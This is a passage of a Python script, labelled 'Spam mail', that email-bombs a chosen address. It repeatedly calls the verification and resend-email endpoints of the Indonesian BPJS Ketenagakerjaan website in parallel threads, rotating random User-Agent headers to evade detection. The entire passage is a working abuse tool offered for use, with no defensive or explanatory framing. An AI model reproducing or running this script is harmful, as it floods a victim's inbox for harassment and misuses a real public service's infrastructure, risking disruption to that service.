...
os.system('cls')
print('[!] Spam mail By Nodejs_SoCute')
mail = input("%sEmail Target =>%s "%(cy,wt))
amount = int(input(f"Amount : "))

data_mail = {'email':mail}
payload = ({'User-Agent':rdm.choice(useragent)})
r = httpx.post('https://www.bpjsketenagakerjaan.go.id/pu/verifEmail',data=data_mail, headers=payload)
print(r.text)


def bpjs():
	try:
		payload2 = ({'User-Agent':rdm.choice(useragent)})
		res = httpx.post('https://www.bpjsketenagakerjaan.go.id/pu/resendEmail',data=data_mail, headers=payload2)
		if res.status_code == 200:
			print(f'[+] Send BPJS to {mail} Success')
		else:
			print(res.status_code,"[-] Send Error")

	except: pass


for _ in range(amount):
	threading.Thread(target=bpjs).start()
